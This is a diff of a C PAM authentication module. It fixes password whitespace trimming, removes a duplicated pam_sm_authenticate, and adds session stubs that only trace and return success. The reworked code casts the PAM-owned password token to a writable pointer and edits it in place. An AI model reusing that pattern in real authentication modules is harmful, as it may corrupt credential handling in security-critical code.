@@ -116,7 +116,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     ensure_path();
 
     // Fix 2: Declare variables BEFORE use (critical line)
-    const char *pword = NULL;
+    char *pword = NULL;  // Changed to char* not const char*
     const char *uname = NULL;
 
     if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
@@ -129,11 +129,12 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         return PAM_AUTHINFO_UNAVAIL;
     }
 
-    // Trim trailing whitespace/newlines from password
-    while (strlen(pword) > 0) {
-        char last = pword[strlen(pword)-1];
+    // Fix 3: Correct password trimming (store length first)
+    size_t len = strlen(pword);
+    while (len > 0) {
+        char last = pword[len - 1];
         if (last == '\n' || last == '\r' || last == '\t' || last == ' ') {
-            pword[--strlen(pword)] = '\0';
+            pword[--len] = '\0';  // Correct: decrement len before using as index
         } else {
             break;
         }
@@ -171,6 +172,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     return PAM_AUTH_ERR;
 }
 
+
 /* ---------------- ACCOUNT ---------------- */
 
 PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
@@ -189,44 +191,32 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
 
 /* ---------------- SESSION ---------------- */
 
-/* ---------------- AUTH MODULE ---------------- */
-
-PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
-                                   int flags,
-                                   int argc,
-                                   const char **argv){
-    // Fix 1: Cast to void to remove warnings
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
+                                  int flags,
+                                  int argc,
+                                  const char *argv[])
+{
     (void) flags;
     (void) argc;
     (void) argv;
 
-    trace_context(pamh, "ENTER pam_sm_authenticate");
-    ensure_path();
+    trace_context(pamh, "ENTER SESSION OPEN");
+    trace("[TRACE] SESSION START");
+    return PAM_SUCCESS;
+}
 
-    // Fix 2: Declare variables BEFORE use (critical line)
-    const char *pword = NULL;
-    const char *uname = NULL;
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
+                                   int flags,
+                                   int argc,
+                                   const char *argv[])
+{
+    (void) flags;
+    (void) argc;
+    (void) argv;
 
-    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
-        trace("PAM_AUTHTOK failed");
-        return PAM_AUTHINFO_UNAVAIL;
-    }
-
-    if (pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS) {
-        trace("PAM_USER failed");
-        return PAM_AUTHINFO_UNAVAIL;
-    }
-
-    // Fix 3: Correct password trimming (was: pword[--strlen(pword)])
-    size_t len = strlen(pword);
-    while (len > 0) {
-        char last = pword[len - 1];
-        if (last == '\n' || last == '\r' || last == '\t' || last == ' ') {
-            pword[--len] = '\0';  // Correct: decrement len before using as index
-        } else {
-            break;
-        }
-    }
+    trace_context(pamh, "ENTER SESSION CLOSE");
+    trace("[TRACE] SESSION END");
+    return PAM_SUCCESS;
 }
 
 /* ---------------- CREDENTIALS ---------------- */
